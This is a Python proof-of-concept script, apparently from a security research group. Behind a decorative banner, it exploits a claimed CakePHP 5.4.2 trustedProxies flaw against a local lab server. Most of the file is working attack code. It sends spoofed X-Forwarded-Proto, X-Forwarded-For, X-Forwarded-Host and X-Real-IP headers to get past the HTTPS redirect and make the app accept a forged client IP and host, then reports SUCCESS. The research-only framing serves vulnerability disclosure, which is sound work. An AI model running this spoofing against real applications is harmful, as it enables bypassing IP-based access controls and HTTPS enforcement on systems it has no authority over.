#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: cakephp-trusted-proxies (High: 7.5)
#  Vendor: CakePHP (Cake Software Foundation)
#  Versions: CakePHP 5.4.2 HttpsEnforcerMiddleware trustedProxies
#  Impact: trustedProxies honors X-Forwarded-* from any REMOTE_ADDR
#  Requires: app set trustedProxies; unauth HTTP; loopback lab
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "cakephp-trusted-proxies"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove CakePHP 5.4.2 trustedProxies honors X-Forwarded-* from any REMOTE_ADDR."""


import http.client
import json
import os
from typing import Any

LABEL = "cakephp-trusted-proxies"
WITNESS = "CAKEPHP-TRUSTED-PROXIES-WITNESS"
PINNED_VERSION = "5.4.2"
LISTED_PROXY = "10.0.0.1"
HOST = "127.0.0.1"
PORT = int(os.environ.get("LAB_PORT", "19430"))
TIMEOUT_S = 12.0
SPOOF_IP = "203.0.113.50"
SPOOF_REAL_IP = "198.51.100.9"
SPOOF_HOST = "spoof.invalid"


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def clip(text: str, limit: int = 240) -> str:
    compact = text.replace("\r", "\\r").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def http_get(path: str, headers: dict[str, str] | None = None) -> tuple[int, dict[str, str], str]:
    extra = headers or {}
    conn = http.client.HTTPConnection(HOST, PORT, timeout=TIMEOUT_S)
    try:
        req_headers = {
            "Host": f"{HOST}:{PORT}",
            "Connection": "close",
            "Accept": "application/json",
        }
        req_headers.update(extra)
        conn.request("GET", path, headers=req_headers)
        response = conn.getresponse()
        body = response.read().decode("utf-8", "replace")
        resp_headers = {key.lower(): value for key, value in response.getheaders()}
        return int(response.status), resp_headers, body
    finally:
        conn.close()


def parse_json(body: str) -> dict[str, Any] | None:
    try:
        payload = json.loads(body)
    except json.JSONDecodeError:
        return None
    if not isinstance(payload, dict):
        return None
    return payload


def require_json(label: str, status: int, body: str) -> dict[str, Any] | int:
    payload = parse_json(body)
    if payload is None:
        return fail(f"{label} not-json status={status} body={clip(body)}")
    return payload


def main() -> int:
    health_status, _health_headers, health_body = http_get("/health")
    health = require_json("health", health_status, health_body)
    if isinstance(health, int):
        return health
    log(
        f"IOC health-status={health_status} cakephp={health.get('cakephp')} "
        f"pin={health.get('pin')}"
    )
    if health_status != 200:
        return fail(f"health-http={health_status} body={clip(health_body)}")
    if health.get("cakephp") != PINNED_VERSION:
        return fail(f"pin-mismatch cakephp={health.get('cakephp')} expected={PINNED_VERSION}")

    nohdr_status, nohdr_headers, nohdr_body = http_get("/")
    nohdr_location = nohdr_headers.get("location", "")
    log(f"IOC trusted-nohdr-status={nohdr_status} location={clip(nohdr_location, 120)}")
    if nohdr_status != 301:
        return fail(
            f"trusted-nohdr expected-301 status={nohdr_status} "
            f"location={clip(nohdr_location)} body={clip(nohdr_body)}"
        )
    if not nohdr_location.startswith("https://"):
        return fail(f"trusted-nohdr location-not-https location={clip(nohdr_location)}")

    control_headers = {
        "X-Forwarded-Proto": "https",
        "X-Forwarded-For": SPOOF_IP,
        "X-Forwarded-Host": SPOOF_HOST,
        "X-Real-IP": SPOOF_REAL_IP,
    }
    control_status, control_hdrs, control_body = http_get("/control", control_headers)
    control_location = control_hdrs.get("location", "")
    log(
        f"IOC control-status={control_status} location={clip(control_location, 120)} "
        f"body={clip(control_body, 80)}"
    )
    if control_status != 301:
        return fail(
            f"control expected-301 status={control_status} "
            f"location={clip(control_location)} body={clip(control_body)}"
        )
    if not control_location.startswith("https://"):
        return fail(f"control location-not-https location={clip(control_location)}")

    proto_status, _proto_hdrs, proto_body = http_get(
        "/",
        {"X-Forwarded-Proto": "https"},
    )
    proto = require_json("proto-spoof", proto_status, proto_body)
    if isinstance(proto, int):
        return proto
    remote_addr = str(proto.get("remote_addr") or "")
    log(
        f"IOC proto-status={proto_status} scheme={proto.get('scheme')} "
        f"uri_scheme={proto.get('uri_scheme')} remote_addr={remote_addr} "
        f"trust_proxy={proto.get('trust_proxy')} witness={proto.get('witness')}"
    )
    if proto_status != 200:
        return fail(f"proto-spoof expected-200 status={proto_status} body={clip(proto_body)}")
    if proto.get("scheme") != "https" or proto.get("uri_scheme") != "https":
        return fail(
            f"proto-spoof scheme={proto.get('scheme')} uri_scheme={proto.get('uri_scheme')}"
        )
    if proto.get("witness") != WITNESS:
        return fail(f"proto-spoof missing-witness body={clip(proto_body)}")
    if remote_addr == LISTED_PROXY:
        return fail(f"remote-addr-was-listed-proxy remote_addr={remote_addr}")
    if not remote_addr:
        return fail("remote-addr-empty")
    if proto.get("trust_proxy") is not True:
        return fail(f"trust_proxy={proto.get('trust_proxy')}")

    spoof_status, _spoof_hdrs, spoof_body = http_get("/", control_headers)
    spoof = require_json("xff-spoof", spoof_status, spoof_body)
    if isinstance(spoof, int):
        return spoof
    log(
        f"IOC spoof-status={spoof_status} client_ip={spoof.get('client_ip')} "
        f"host={spoof.get('host')} remote_addr={spoof.get('remote_addr')}"
    )
    if spoof_status != 200:
        return fail(f"xff-spoof expected-200 status={spoof_status} body={clip(spoof_body)}")
    if spoof.get("client_ip") != SPOOF_IP:
        return fail(f"client-ip={spoof.get('client_ip')} expected={SPOOF_IP}")
    if spoof.get("host") != SPOOF_HOST:
        return fail(f"host={spoof.get('host')} expected={SPOOF_HOST}")
    if spoof.get("witness") != WITNESS:
        return fail(f"xff-spoof missing-witness body={clip(spoof_body)}")

    real_status, _real_hdrs, real_body = http_get(
        "/",
        {
            "X-Forwarded-Proto": "https",
            "X-Real-IP": SPOOF_REAL_IP,
        },
    )
    real = require_json("x-real-ip", real_status, real_body)
    if isinstance(real, int):
        return real
    log(f"IOC x-real-ip-status={real_status} client_ip={real.get('client_ip')}")
    if real_status != 200:
        return fail(f"x-real-ip expected-200 status={real_status} body={clip(real_body)}")
    if real.get("client_ip") != SPOOF_REAL_IP:
        return fail(f"x-real-ip client-ip={real.get('client_ip')} expected={SPOOF_REAL_IP}")

    log(
        f"SUCCESS {LABEL} pin={PINNED_VERSION} how=app "
        f"remote-addr={remote_addr} listed-proxy={LISTED_PROXY} "
        f"proto-bypass={proto_status} control-redirect={control_status} "
        f"client-ip={spoof.get('client_ip')} host={spoof.get('host')} "
        f"x-real-ip={real.get('client_ip')} {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

